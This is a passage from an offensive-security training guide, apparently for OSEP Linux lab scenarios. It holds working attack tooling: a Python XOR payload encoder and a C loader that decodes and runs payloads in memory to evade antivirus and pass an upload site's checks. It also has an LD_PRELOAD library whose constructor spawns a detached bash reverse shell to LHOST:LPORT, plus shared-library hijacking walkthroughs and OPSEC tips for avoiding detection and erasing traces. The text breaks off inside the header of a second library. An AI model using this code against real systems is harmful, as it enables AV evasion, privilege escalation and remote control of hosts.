::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# 13 · Linux attack surface (scenarios 36–40, 48)

> Scenario map: 36 Linux upload site runs ELF but still requires a business check · 37 Linux target has AV · 38 Linux program loads a shared library from a path you control · 39 sudo allows only one editor/interpreter · 40 you can overwrite an artifact but cannot log into the consumer hosts · 48 no SSH password, but an already-authenticated reusable connection exists.
> Aligned with cheat-sheet sections: `Payloads (XOR Payload Encoder / Simple Loader / Shared Library LD PRELOAD / Shared Library LD LIBRARY Path)`, `Abusing SUIDs`, `SSH Hijacking with ControlMaster / SSH Agent Forwarding`, `Artifactory (JFrog)`.
> Placeholders: `LHOST` (attacker IP) `LPORT` (listener port) `TARGET` (target address) `USER` `PASS` `DOMAIN` `PAYLOAD`. Commands assume x86_64 Linux unless noted.

## Overview

| Scenario | One-line goal | Key scripts |
|---|---|---|
| 36 | ELF is executed but must pass a business check | `m13-xor-encoder.py` + `m13-simple-loader.c` (business-output mode) |
| 37 | Common ELF is detected by Linux AV | `m13-xor-encoder.py` + `m13-simple-loader.c` (in-memory decode mode) |
| 38 | Program loads a shared library from a path you control | `m13-shared-library-ldpreload.c` / `m13-shared-library-ldlibrarypath.c` |
| 39 | sudo allows only one editor/interpreter | `m13-sudo-gtfobins.sh` |
| 40 | You can overwrite the artifact; you cannot log into the consumer | `m13-artifactory-replace.sh` |
| 48 | No SSH password, but a reusable connection exists | `m13-ssh-controlmaster-hijack.sh` |

**Core Linux vs Windows difference (module premise)**: there is no AMSI/ETW/AppLocker stack and no “process hollowing” concept. The defense surface is mainly on-disk AV signature scanning (ClamAV and similar on-access scanners), runtime monitoring (`auditd`/eBPF/LSM), the SUID/sudo privilege model, and writable directories plus dynamic-linker search order. Windows AV-bypass patterns (patch ETW, reflective managed load) do not apply here. Reframe to: **leave no plaintext payload on disk, decode and execute in memory, reuse privilege/trust context instead of stealing credentials**.

---

## Scenario 36 · Linux upload site executes ELF, but the program must still pass a business check

### Situation
The lab has an “upload-and-execute” site (it accepts an ELF and runs it). Uploading a plain reverse-shell ELF fails: the site has a **business check** — a wrapper runs your upload and requires that it (a) print expected business output/banner, (b) stay alive for a fixed window (lifecycle check), or (c) finally exit 0. A bare shell ELF either exits immediately (session dies with it) or prints no business output and is marked FAIL and killed.

### Assumptions
- The site runs the upload as your user (not setuid to root).
- From the scenario text or a readable wrapper you can infer the expected “business output” (e.g. must print `Usage: run ...` or a heartbeat loop).
- Outbound TCP to `LHOST:LPORT` is allowed (same egress conditions as earlier scenarios).
- Attacker host has gcc and python3 to build the loader and encode the file.
- The upload directory is writable so you can upload both the loader and the data file; if it is execute-only / deleted after run, switch to the embedded-payload mode (see failure branches).

### Prepare (attacker)
1. Prepare stage-2 ELF (reverse agent or `/bin/sh` reverse), e.g. a minimal reverse program or a compiled stage2.
2. Encode stage2 with `m13-xor-encoder.py` into `stage2.enc` (ciphertext on disk; avoids signature/content checks).
3. Build the loader in business mode:
   - External: `gcc -o loader loader.c` (loader and `stage2.enc` in the same directory).
   - Embedded: first `m13-xor-encoder.py --c-array` for a byte array, then compile it into the loader.
4. Start a listener: `nc -lvnp LPORT` or your C2 listener.

### Procedure
1. Build a “legitimate shell”: the loader parent prints the business banner and enters a loop (heartbeat) matching site expectations.
2. Upload `loader` and `stage2.enc` to the site’s designated directory.
3. Trigger execution (site button/API, or whatever trigger you found).
4. Confirm site output: business check passes (banner matches, process stays alive).
5. Loader decodes `stage2.enc` and starts stage2 **in a child** from memory (mmap→mprotect, no plaintext on disk).
6. After the callback arrives, the loader parent exits cleanly (exit 0) and leaves no suspicious long-lived process.

### Lab files
- `m13-xor-encoder.py`: XOR-encode stage2 (file mode / C-array mode).
- `m13-simple-loader.c`: read/embed encoded payload, decode and run in memory; includes business-output mode and heartbeat lifecycle logic.

### Verify
- Site shows business check PASS (correct banner, process alive for the check window).
- Attacker listener gets a session: `id` / `whoami` match expectations.
- After the check window, loader exits normally; no plaintext payload remains on disk.

### Failure branches / fallbacks
1. **Site requires an exact banner/output**: change the loader `BANNER` macro to the exact required text, rebuild, re-upload.
2. **Upload dir deleted after exec / not writable again**: use embed mode (encode payload into a single loader file) and support a `-banner` argument for business output.
3. **Arch mismatch** (site is x86_64 but stage2/loader is 32-bit or vice versa): rebuild both with `gcc -m64`/`-m32`; verify with `file loader stage2.enc`.
4. **Business check kills the process after a fixed time**: have stage2 fork an independent session as soon as it is decoded; loader only needs “business output + exit 0” before the window ends — it does not need to stay resident.
5. **Callback filtered (only same-subnet as the site)**: skip reverse connect; have stage2 write results to the loader’s stdout (piggyback on the business-output channel) and read them from the site page.

### Exam OPSEC
- Match the banner to the legitimate program’s output so logs do not show a “PASS but weird banner”.
- Disk should only show `.enc`/loader — never upload a plaintext reverse ELF.
- After the session lands, do not dump sensitive output into site-visible stdout; confirm quietly first.
- Before leaving, clean leftover `stage2.enc` and loader from the upload dir (if the scenario still allows writes).

---

#### `m13-xor-encoder.py` {#m13-xor-encoder-py}

````python
#!/usr/bin/env python3
"""Purpose: Single-byte (or multi-byte) XOR encode a Linux payload (ELF / raw shellcode file),
emit a .enc file or a C array; pair with m13-simple-loader.c to decode and run in memory so
plaintext payload never appears on disk.

Scenario: M13 scenario 36 (upload site runs ELF; disk/content must pass a business check)
      and scenario 37 (Linux AV file signatures; common ELF is detected).

Depends: Python 3.7+ (stdlib argparse).

Usage:
    # Encode to file (external-file loader mode reads this)
    python3 m13-xor-encoder.py -i shellcode.bin -k 0xfa -o stage2.enc

    # Emit C array (embed mode: paste into m13-simple-loader.c enc_payload[])
    python3 m13-xor-encoder.py -i shellcode.bin -k 0xfa --c-array

    # Round-trip self-test: decode must match -i exactly
    python3 m13-xor-encoder.py -i stage2.enc -k 0xfa -d -o plain.bin && cmp plain.bin shellcode.bin

    # Multi-byte key example: -k 0xfa,0x1b,0x2c (decoder must match; loader default is single-byte)
    python3 m13-xor-encoder.py -i shellcode.bin -k 0xfa,0x1b -o stage2.enc

Placeholders: LHOST/LPORT only exist inside the encoded payload (chosen when you build the
       payload; this script does not know them). Default key is 0xfa; change with -k and keep
       the loader side identical.

Test status: Syntax passes ast.parse; encode/decode symmetry can be self-tested offline
(see -d above); not exercised on a live target.
"""
from __future__ import annotations

import argparse
import sys

def parse_key(text: str) -> list[int]:
    """Parse -k: 0xfa / 250 / comma-separated multi-byte 0xfa,0x1b. Range 0-255."""
    keys: list[int] = []
    for part in text.split(","):
        part = part.strip()
        try:
            value = int(part, 0) if part.lower().startswith("0x") else int(part)
        except ValueError:
            raise SystemExit(f"[-] invalid key: {part!r} (example: -k 0xfa or -k 250,0x1b)")
        if not 0 <= value <= 255:
            raise SystemExit(f"[-] key out of range (0-255): {part}")
        keys.append(value)
    return keys

def xor_bytes(data: bytes, keys: list[int]) -> bytes:
    """Single-/multi-byte XOR: key cycles."""
    if len(keys) == 1:
        k = keys[0]
        return bytes(b ^ k for b in data)
    return bytes(b ^ keys[i % len(keys)] for i, b in enumerate(data))

def emit_c_array(data: bytes, name: str = "enc_payload") -> str:
    """Emit a C byte array pasteable into m13-simple-loader.c."""
    lines = [f"static unsigned char {name}[] = {{"]
    for i in range(0, len(data), 12):
        chunk = ", ".join(f"0x{b:02X}" for b in data[i : i + 12])
        lines.append("    " + chunk + ",")
    lines.append("};")
    return "\n".join(lines)

def main() -> int:
    ap = argparse.ArgumentParser(description="XOR payload encoder (M13 scenarios 36/37)")
    ap.add_argument("-i", "--input", required=True, help="input payload file path")
    ap.add_argument("-o", "--output", default="", help="output file path (ignored with --c-array)")
    ap.add_argument("-k", "--key", default="0xfa", help="XOR key: 0xfa / 250 / 0xfa,0x1b")
    ap.add_argument("--c-array", action="store_true", help="emit C array to stdout (paste into loader)")
    ap.add_argument("-d", "--decode", action="store_true", help="decode mode (round-trip self-test)")
    args = ap.parse_args()

    keys = parse_key(args.key)
    try:
        with open(args.input, "rb") as fh:
            data = fh.read()
    except OSError as exc:
        print(f"[-] read failed {args.input}: {exc}", file=sys.stderr)
        return 1
    if not data:
        print(f"[-] empty input: {args.input}", file=sys.stderr)
        return 1

    verb = "decode" if args.decode else "encode"
    out = xor_bytes(data, keys)
    print(f"[*] {verb}: {args.input} ({len(data)} B) key={args.key}")

    if args.c_array:
        sys.stdout.write(emit_c_array(out) + "\n")
        return 0

    dest = args.output or (args.input + (".dec" if args.decode else ".enc"))
    try:
        with open(dest, "wb") as fh:
            fh.write(out)
    except OSError as exc:
        print(f"[-] write failed {dest}: {exc}", file=sys.stderr)
        return 1
    print(f"[+] wrote: {dest} ({len(out)} B)")
    return 0

if __name__ == "__main__":
    sys.exit(main())
````

#### `m13-simple-loader.c` {#m13-simple-loader-c}

````c
/* Purpose: Custom Linux ELF/shellcode loader — read XOR-encrypted payload, mmap memory → decode →
 *       mprotect executable → jump; if decoded bytes are a full ELF, run via anonymous memfd.
 *       Disk only sees ciphertext (.enc) or an embedded array — no plaintext signature for file AV
 *       (scenario 37). Optional business banner + heartbeat + exit 0 to pass upload-site business
 *       checks (scenario 36).
 * Scenario: 36 (upload site runs ELF but requires a business check), 37 (Linux target has AV;
 *       common ELF is detected)
 * Depends: gcc (target Linux x86_64; 32-bit needs gcc -m32 + multilib); ELF path needs kernel 3.17+
 *       (memfd_create)
 * Build:
 *   # 1) External-file mode (loader and stage2.enc in the same directory)
 *   gcc -Wall -O2 -s -o loader m13-simple-loader.c
 *   # 2) Embed mode (replace enc_payload[] with encoder --c-array output, then compile; single file)
 *   gcc -Wall -O2 -s -DEMBED_PAYLOAD -o loader m13-simple-loader.c
 *   # 3) Force arch / static link (target missing runtime libs)
 *   gcc -Wall -O2 -m32 -static -o loader m13-simple-loader.c
 *   gcc -Wall -O2 -m64 -static -o loader m13-simple-loader.c
 * Companion encoder (m13-xor-encoder.py, attacker side):
 *   python3 m13-xor-encoder.py -i shellcode.bin -k 0xfa -o stage2.enc          # ciphertext for external mode
 *   python3 m13-xor-encoder.py -i shellcode.bin -k 0xfa --c-array              # C array for embed mode
 *   python3 m13-xor-encoder.py -i stage2.enc -k 0xfa -d -o plain.bin           # self-test: must match original
 * Usage:
 *   ./loader stage2.enc                            # decode and run in memory (shellcode jump / ELF via memfd)
 *   ./loader stage2.enc -k 0xfa                    # XOR key (default 0xfa; must match encode)
 *   ./loader stage2.enc -b "Usage: run <file>"     # business mode: print banner, then run
 *   ./loader stage2.enc -b "OK" -a 30              # banner + heartbeat every 5s; exit 0 after 30s
 *   ./loader                                       # embed mode (-DEMBED_PAYLOAD at build); no .enc needed
 *   ./loader -h                                    # show all options
 * Placeholders: this file has no real addresses; LHOST/LPORT live only inside the encoded payload
 *         (chosen when you build the payload). Default XOR key 0xfa; change with -k or -DXOR_KEY=0xNN;
 *         both sides must match.
 * Test status: compiles with gcc -Wall -c locally (macOS/clang is syntax-only; function needs a Linux
 *          target). ELF exec branch is compiled only under __linux__; non-Linux builds print a clear
 *          message instead of failing silently.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>

#ifdef __linux__
#include <sys/syscall.h>
#endif

#ifndef XOR_KEY
#define XOR_KEY 0xfa
#endif

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 1U
#endif

#ifndef MAP_ANONYMOUS
#define MAP_ANONYMOUS MAP_ANON
#endif

#ifdef EMBED_PAYLOAD
/* EMBED_BEGIN — embed mode: replace the default array below with m13-xor-encoder.py --c-array output */
static unsigned char enc_payload[] = { 0x90 };
/* EMBED_END */
#endif

static void usage(const char *self)
{
    fprintf(stderr,
            "Usage: %s [stage2.enc] [options]\n"
            "  -k, --key <0xNN>      XOR key (default 0x%02x; must match encode)\n"
            "  -b, --banner <text>   print business banner before exec (scenario 36 check)\n"
            "  -a, --alive <sec>     keep heartbeat after banner; exit 0 when time is up\n"
            "  -h, --help            show this help\n"
            "Example: %s stage2.enc -k 0xfa -b \"Usage: run <file>\" -a 30\n",
            self, (unsigned)XOR_KEY, self);
}

static unsigned char *read_all(const char *path, size_t *out_len)
{
    FILE *f = fopen(path, "rb");
    if (!f) {
        fprintf(stderr, "[!] open failed %s: %s\n", path, strerror(errno));
        return NULL;
    }
    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return NULL; }
    long n = ftell(f);
    if (n <= 0) {
        fprintf(stderr, "[!] empty file or cannot seek length: %s\n", path);
        fclose(f);
        return NULL;
    }
    rewind(f);
    unsigned char *buf = (unsigned char *)malloc((size_t)n);
    if (!buf) { fclose(f); return NULL; }
    size_t got = fread(buf, 1, (size_t)n, f);
    fclose(f);
    if (got != (size_t)n) {
        fprintf(stderr, "[!] short read: %s (%zu/%ld)\n", path, got, n);
        free(buf);
        return NULL;
    }
    *out_len = (size_t)n;
    return buf;
}

static void xor_decode(unsigned char *buf, size_t len, unsigned int key)
{
    for (size_t i = 0; i < len; i++) buf[i] = (unsigned char)(buf[i] ^ (key & 0xff));
}

static int is_elf(const unsigned char *buf, size_t len)
{
    return len > 4 && buf[0] == 0x7f && buf[1] == 'E' && buf[2] == 'L' && buf[3] == 'F';
}

/* Shellcode path: mmap(RW) → copy+decode → mprotect(RX) → jump.
 * Keep decode as RW only to avoid long-lived RWX mappings (common eBPF/LSM detection). */
static void run_shellcode(const unsigned char *code, size_t len)
{
    long page = sysconf(_SC_PAGESIZE);
    if (page <= 0) page = 4096;
    size_t map_len = ((len + (size_t)page - 1) / (size_t)page) * (size_t)page;

    void *mem = mmap(NULL, map_len, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) {
        fprintf(stderr, "[!] mmap failed: %s\n", strerror(errno));
        return;
    }
    memcpy(mem, code, len);
    if (mprotect(mem, map_len, PROT_READ | PROT_EXEC) != 0) {
        fprintf(stderr, "[!] mprotect(RX) failed: %s (if kernel/LSM enforces W^X, try -DUSE_RWX or an interpreter load)\n",
                strerror(errno));
        munmap(mem, map_len);
        return;
    }
    void (*entry)(void) = (void (*)(void))mem;
    entry();
    munmap(mem, map_len);
}

#ifdef __linux__
static int write_all_fd(int fd, const unsigned char *buf, size_t len)
{
    size_t off = 0;
    while (off < len) {
        ssize_t w = write(fd, buf + off, len - off);
        if (w < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        off += (size_t)w;
    }
    return 0;
}

/* ELF path: write into a memory file then exec — no plaintext ELF on disk.
 * Prefer memfd_create; fall back to /dev/shm (unlink after use) on older kernels/seccomp. */
static int drop_payload(const unsigned char *buf, size_t len, char *path, size_t cap)
{
    path[0] = '\0';
#ifdef SYS_memfd_create
    int fd = (int)syscall(SYS_memfd_create, "stage2", MFD_CLOEXEC);
    if (fd >= 0) {
        if (write_all_fd(fd, buf, len) == 0) return fd;
        close(fd);
    }
#endif
    snprintf(path, cap, "/dev/shm/.stage2.%ld", (long)getpid());
    fd = open(path, O_RDWR | O_CREAT | O_TRUNC, 0700);
    if (fd < 0) {
        fprintf(stderr, "[!] open %s failed: %s\n", path, strerror(errno));
        return -1;
    }
    if (write_all_fd(fd, buf, len) != 0) {
        fprintf(stderr, "[!] write %s failed: %s\n", path, strerror(errno));
        close(fd);
        return -1;
    }
    return fd;
}

static void run_elf(const unsigned char *buf, size_t len)
{
    char path[256];
    int fd = drop_payload(buf, len, path, sizeof(path));
    if (fd < 0) _exit(127);

    char exe[128];
    if (path[0] == '\0') snprintf(exe, sizeof(exe), "/proc/self/fd/%d", fd);
    else snprintf(exe, sizeof(exe), "%s", path);

    char *const argv[] = { (char *)"stage2", NULL };
    execve(exe, argv, environ);
    fprintf(stderr, "[!] execve(%s) failed: %s\n", exe, strerror(errno));
    _exit(127);
}
#else
static void run_elf(const unsigned char *buf, size_t len)
{
    (void)buf;
    (void)len;
    fprintf(stderr, "[!] ELF exec branch is only available on Linux targets (this binary is for non-Linux syntax checks)\n");
    _exit(127);
}
#endif

int main(int argc, char **argv)
{
    const char *path = NULL;
    const char *banner = NULL;
    int alive = 0;
    unsigned int key = XOR_KEY;

    for (int i = 1; i < argc; i++) {
        if ((!strcmp(argv[i], "-k") || !strcmp(argv[i], "--key")) && i + 1 < argc) {
            key = (unsigned int)strtoul(argv[++i], NULL, 0) & 0xff;
        } else if ((!strcmp(argv[i], "-b") || !strcmp(argv[i], "--banner")) && i + 1 < argc) {
            banner = argv[++i];
        } else if ((!strcmp(argv[i], "-a") || !strcmp(argv[i], "--alive")) && i + 1 < argc) {
            alive = atoi(argv[++i]);
        } else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
            usage(argv[0]);
            return 0;
        } else if (argv[i][0] != '-') {
            path = argv[i];
        } else {
            fprintf(stderr, "[!] unknown option: %s\n", argv[i]);
            usage(argv[0]);
            return 2;
        }
    }

    unsigned char *buf = NULL;
    size_t len = 0;

#ifdef EMBED_PAYLOAD
    if (!path) {
        len = sizeof(enc_payload);
        buf = (unsigned char *)malloc(len);
        if (!buf) { fprintf(stderr, "[!] out of memory\n"); return 1; }
        memcpy(buf, enc_payload, len);
    }
#endif

    if (!buf) {
        if (!path) {
            fprintf(stderr, "[!] missing payload file (external mode needs stage2.enc; or build with -DEMBED_PAYLOAD)\n");
            usage(argv[0]);
            return 2;
        }
        buf = read_all(path, &len);
        if (!buf) return 1;
    }

    xor_decode(buf, len, key);
    if (!len) {
        fprintf(stderr, "[!] empty payload\n");
        free(buf);
        return 1;
    }

    if (banner) {
        printf("%s\n", banner);
        fflush(stdout);
    }

    /* Child runs payload: parent owns business output/heartbeat; when parent exits, child is reparented to init and the session stays up */
    pid_t pid = fork();
    if (pid < 0) {
        fprintf(stderr, "[!] fork failed: %s\n", strerror(errno));
        free(buf);
        return 1;
    }
    if (pid == 0) {
        if (is_elf(buf, len)) run_elf(buf, len);
        else run_shellcode(buf, len);
        _exit(0);
    }

    free(buf);

    if (alive > 0) {
        int left = alive;
        while (left > 0) {
            sleep(left > 5 ? 5 : (unsigned)left);
            left -= left > 5 ? 5 : left;
            if (banner) {
                printf("%s\n", banner);
                fflush(stdout);
            }
        }
        return 0;   /* business-check window done: exit 0 cleanly; payload child keeps running */
    }

    int st = 0;
    waitpid(pid, &st, 0);
    return WIFEXITED(st) ? WEXITSTATUS(st) : 1;
}
````

## Scenario 37 · Linux target also has AV; common ELF is detected

### Situation
The Linux host has AV (typically ClamAV on-access/on-scan; the exam may also use a signature scanner over disk files). Common generated ELF — e.g. msfvenom `linux/x64/shell_reverse_tcp`, or stock reverse binaries from the internet — is detected/deleted on land or on exec. **Windows techniques (patch AMSI/ETW, process hollowing, managed reflection) do not work here**; rebuild for the Linux detection model.

### Assumptions
- AV is primarily file scanning (local test: `clamscan PAYLOAD`); whether runtime monitoring (auditd/eBPF) is also present is unknown — assume yes.
- You control payload shape and placement (disk vs pure memory).
- You do not need to bypass login/rights — only keep your ELF alive and callback.

### Prepare (attacker)
1. Red-team self-test on the attacker box: `clamscan stage2`, `file stage2`, `strings stage2 | grep -iE 'socket|/bin/sh'` — confirm what gets signed.
2. XOR-encode stage2 with `m13-xor-encoder.py` to `.enc` (on-disk form no longer carries plaintext signature features).
3. Build `m13-simple-loader.c` (in-memory decode): `mmap(PROT_READ|PROT_WRITE)` → decode → `mprotect(PROT_READ|PROT_EXEC)` → jump; never write plaintext to disk.
4. (Optional) Use a `memfd_create()` variant so even `.enc` is not needed on disk.

### Procedure
1. Deliver only the loader (+ `.enc`); disguise the loader name as business-related (`update`, `monitor`) — filename should not reveal intent.
2. Trigger run; loader reads `.enc` into anonymous memory and executes stage2.
3. Stage2 callbacks to `LHOST:LPORT`; confirm the session on your listener.
4. Inside the session, avoid writing plaintext tools to `/tmp`; re-use encode + in-memory load when needed.

### Lab files
- `m13-xor-encoder.py` (changes the on-disk signature surface).
- `m13-simple-loader.c` (in-memory decode; avoids plaintext on disk).

### Verify
- Run `clamscan` on loader/`.enc` before and after delivery: loader clean or light; `.enc` lacks original signatures.
- Listener gets a session after exec; no plaintext stage2 under `/proc/<pid>/maps` or `ls -l /tmp`.
- If on-access scanning is present, confirm no alert in logs at the moment of delivery.

### Failure branches / fallbacks
1. **Static loader itself is detected**: shrink/simplify the loader (drop high-frequency strings like `system`/`socket`; call via `syscall()`); or add a packer layer (upx / custom compress) and re-self-test.
2. **eBPF/LSM runtime monitoring blocks `mprotect RW→RX`**: map as `PROT_READ|PROT_EXEC` from the start then write (when W^X is hard-enforced) or use `memfd_create` + an existing interpreter (`python3`/`perl`) to run memory contents and avoid mmap RWX features.
3. **Signature is “behavior/metadata” not content** (e.g. embedded C2 domain/IP in the ELF): split/XOR-restore `LHOST` at runtime so plaintext IP never appears outside `.enc`.
4. **AV also blocks `.enc` (rare; usually content-signed)**: change suffix/header (fake magic); loader skips the offset then decodes.
5. **No file writes allowed at all**: drop the file carrier; run the in-memory decode logic of `m13-simple-loader` through whatever stdin/arg injection channel the scenario already gives for ELF exec.

### Exam OPSEC
- Do not `wget`/`curl` plaintext payload into `/tmp` on the target — that is when file scanners bite hardest.
- Compile with `-s` (strip); avoid extra RWX beyond what you need (no gratuitous `-z execstack`); self-test before going live.
- Do not immediately kill AV processes from the session — that often triggers correlated alerts.

---

## Scenario 38 · Linux program loads a shared library from a path you control

### Situation
A higher-privilege program on the target (service / cron / triggered script) resolves a shared library that is missing, or that can be resolved from a path you can write. The idea is not to patch the binary, but to **make the dynamic linker run your `.so` constructor at load time**. Two main lines: `LD_PRELOAD` (force-load your library first whether or not anything is missing) and `LD_LIBRARY_PATH` (the program really lacks a library; you place a **same-named library exporting the same symbols** ahead in the search path). Mechanisms differ: name match, symbol export, load order, and setuid “secure-execution” limits all matter.

### Assumptions
- You can control the target program’s environment (the service/script that runs it is yours or triggered from a path you control), or you can write into a directory on its search path.
- You have code execution (can upload a `.so`, e.g. via upload site / writable dir), but **no password for the target user** — goal is to borrow the program’s higher rights.
- If the target is setuid/setgid: glibc ignores `LD_PRELOAD` and `LD_LIBRARY_PATH` under AT_SECURE; confirm first (`getauxval` / `ldd` behavior). Otherwise the real entry is “program is missing a library and its RPATH/RUNPATH points at a writable directory”.

### Prepare (attacker)
1. Map the target and missing libs:
   - `ldd TARGET_BIN` (look for missing/not found)
   - `readelf -d TARGET_BIN | grep -E 'RPATH|RUNPATH|NEEDED'`
   - `sudo -l` / `ps aux` / `systemctl list-units` to see when/as whom it runs.
2. Pick which line to take (below).
3. Build the `.so` on the attacker box (see compile commands in the script headers) and upload it.

### Procedure
**A. LD_PRELOAD line (`m13-shared-library-ldpreload.c`)**
1. Program already runs normally (libs present) → inject with `LD_PRELOAD`:
   - `LD_PRELOAD=/path/to/lib.so TARGET_BIN [args...]`
2. Your library uses `__attribute__((constructor))` to run priv-esc/callback code at load time, then **preserves original program behavior** (do not override normal functions and crash the business).
3. If the program is setuid, first check whether `LD_PRELOAD` is ignored: no effect after `LD_PRELOAD=... TARGET_BIN` → switch to B or another entry (this limit is a feature, not a bug).

**B. LD_LIBRARY_PATH line (`m13-shared-library-ldlibrarypath.c`)**
1. Program is missing a lib (`ldd` shows `not found`, e.g. `libcrypto.so.1.1`) → the library **name must match exactly**.
2. Place a same-named `.so` in a directory you control; prepend search with `LD_LIBRARY_PATH=/controlled/dir`: `LD_LIBRARY_PATH=/tmp/x TARGET_BIN`.
3. The `.so` must export symbols the program uses (stub whatever is missing: copy the export table with `nm -D` from the real lib, or use the “dlopen real lib then forward” pattern from the cheat sheet), and also run your code from `__attribute__((constructor))`.
4. Confirm resolution with `ldd`: `LD_LIBRARY_PATH=/controlled/dir ldd TARGET_BIN` should show your `.so`.
5. Trigger the program (service restart / job / wait for cron) and confirm your code runs as the target identity.

### Lab files
- `m13-shared-library-ldpreload.c`: LD_PRELOAD injection (does not require a missing library).
- `m13-shared-library-ldlibrarypath.c`: same-name replacement for a missing library (must verify name and exported symbols).

### Verify
- `ldd` shows the target library path pointing at your file (LD_LIBRARY_PATH line).
- Listener receives a callback as the target user, or `id` shows successful privilege gain.
- The host program still completes its normal business (no crash, no error spam).

### Failure branches / fallbacks
1. **Name mismatch / missing export → `symbol lookup error`**: use `nm -D` to stub every referenced symbol from the real lib; name must match character-for-character (including `.so.1.1`-style version suffixes).
2. **LD_PRELOAD ignored on setuid**: confirm setuid (`ls -l` / `find -perm -4000`); if yes, switch to “writable RPATH directory” or another non-setuid high-priv entry — do not burn time on “why PRELOAD did nothing”.
3. **Load-order issues**: LD_PRELOAD always loads first; LD_LIBRARY_PATH is inserted after RPATH and before default paths — if the binary has its own RPATH elsewhere, LD_LIBRARY_PATH will not win; replace the same-named library inside the RPATH directory instead.
4. **Program crashes on start**: `fork()` the callback into a child inside the constructor before heavy work so the parent keeps the original init path; or delay until a business function is called.
5. **Environment sanitized** (service uses `env -i` / systemd clears env): set the vars in something the program itself reads (wrapper script, writable `/etc/environment`), or replace the real library file in its load directory (backup first).

### Exam OPSEC
- Backup original libraries/files first; restore on exit to avoid business outage exposure.
- After priv-esc/callback, do not leave shell history (`.bash_history`) or plaintext `.so` sources.
- Setuid cases: do not treat “PRELOAD ineffective” as a bug and retry forever — check `file`/`ls -l` for AT_SECURE first.

---

#### `m13-shared-library-ldpreload.c` {#m13-shared-library-ldpreload-c}

````c
/* Purpose: Shared-library payload for LD_PRELOAD — on load (constructor), run the payload in a
 *       detached child process; do not override any host symbols so host behavior, output, and
 *       exit code stay unchanged (no crash, no error spam).
 * Scenario: 38 (Linux program loads a shared library from a path you control / preload allowed)
 * Depends: gcc; Linux x86_64; -ldl (optional HOOK_GETEUID uses dlsym(RTLD_NEXT) to forward)
 * Build:
 *   gcc -Wall -fPIC -shared -O2 -o libpreload.so m13-shared-library-ldpreload.c -ldl
 *   # Trigger on call (not on load) with a forwarding hook:
 *   gcc -Wall -fPIC -shared -O2 -DHOOK_GETEUID -o libpreload.so m13-shared-library-ldpreload.c -ldl
 *   # 32-bit host:
 *   gcc -Wall -m32 -fPIC -shared -O2 -o libpreload.so m13-shared-library-ldpreload.c -ldl
 * Usage:
 *   LD_PRELOAD=./libpreload.so /usr/local/bin/target
 *   PAYLOAD_CMD='bash -i >& /dev/tcp/LHOST/LPORT 0>&1' LD_PRELOAD=./libpreload.so /usr/bin/id
 *   # Troubleshoot: confirm load (setuid AT_SECURE ignores LD_PRELOAD)
 *   LD_PRELOAD=./libpreload.so /usr/bin/id; ls -l /usr/bin/id
 * Placeholders: LHOST=attacker IP, LPORT=listener port (baked into DEFAULT_CMD, or override with
 *       PAYLOAD_CMD env)
 * Test status: Compiles with gcc -Wall -fPIC -c locally; not exercised on a Linux target.
 *
 * Design notes (scenario 38 line A):
 *   1. Constructor only forks; heavy work stays in the child; parent returns immediately so host init is undisturbed.
 *   2. Double-fork (middle child exits and is reaped here) avoids zombies without changing the host SIGCHLD handler.
 *   3. By default hijack no symbols — simplest way to preserve host behavior; enable -DHOOK_GETEUID when needed;
 *      that hook forwards via dlsym(RTLD_NEXT) to the real geteuid and returns the native value.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

#ifdef HOOK_GETEUID
#include <dlfcn.h>
#endif

#ifndef DEFAULT_CMD
#define DEFAULT_CMD "/bin/sh -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"
#endif

static int g_fired = 0;

/* Run payload in grandchild: fully detached (new session); host exit does not kill an established session */
static void fire_payload(void)
{
    if (g_fired) return;
    g_fired = 1;

    const char *cmd = getenv("PAYLOAD_CMD");
    if (!cmd || !*cmd) cmd = DEFAULT_CMD;

    pid_t pid = fork();
    if (pid < 0) return;
    if (pid == 0) {
        pid_t grand = fork();
        if (grand == 0) {
            setsid();
            execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
            _exit(127);
        }
        _exit(0);            /* middle child exits immediately; parent reaps — no zombie */
    }
    int st = 0;
    waitpid(pid, &st, 0);
}

__attribute__((constructor))
static void m13_preload_init(void)
{
    fire_payload();
}

#ifdef HOOK_GETEUID
/* Optional: hijack geteuid for "fire on call", then forward to the real implementation.
 * On resolve failure fall back to getuid() instead of an error — prefer missing one priv check over crashing the host. */
uid_t geteuid(void)
{
    static uid_t (*real_geteuid)(void) = NULL;
    static int resolved = 0;

    if (!resolved) {
        union { void *sym; uid_t (*fn)(void); } u;
        u.sym = dlsym(RTLD_NEXT, "geteuid");
        real_geteuid = u.fn;
        resolved = 1;
    }

    fire_payload();

    if (real_geteuid) return real_geteuid();
    return getuid();
}
#endif
````

#### `m13-shared-library-ldlibrarypath.c` {#m13-shared-library-ldlibrarypath-c}

````c
/* Purpose: Shared library for LD_LIBRARY_PATH hijack — filename must match the missing library
 *       character-for-character (including .so.N suffix); export symbols the host uses and forward
 *       via dlsym(RTLD_NEXT) to the real implementation; fire the payload once on first call;
 *       return values match native (host does not crash / business continues); constructor also
 *       fires once as a fallback.
 * Scenario: 38 (Linux program loads a shared library from a path you control)
 * Depends: gcc; Linux x86_64; -ldl (required for dlsym forwarding)
 * Build:
 *   gcc -Wall -fPIC -shared -O2 -o libmissing.so.1.1 m13-shared-library-ldlibrarypath.c -ldl
 *   # 32-bit host: gcc -m32 -fPIC -shared -O2 -o libmissing.so.1.1 m13-shared-library-ldlibrarypath.c -ldl
 * Usage:
 *   # 1) Confirm which lib is missing and where it resolves
 *   ldd /usr/local/bin/target | grep 'not found'
 *   LD_LIBRARY_PATH=/tmp/x ldd /usr/local/bin/target
 *   # 2) Trigger (service restart / cron / manual)
 *   LD_LIBRARY_PATH=/tmp/x /usr/local/bin/target
 * Symbol check (this decides success):
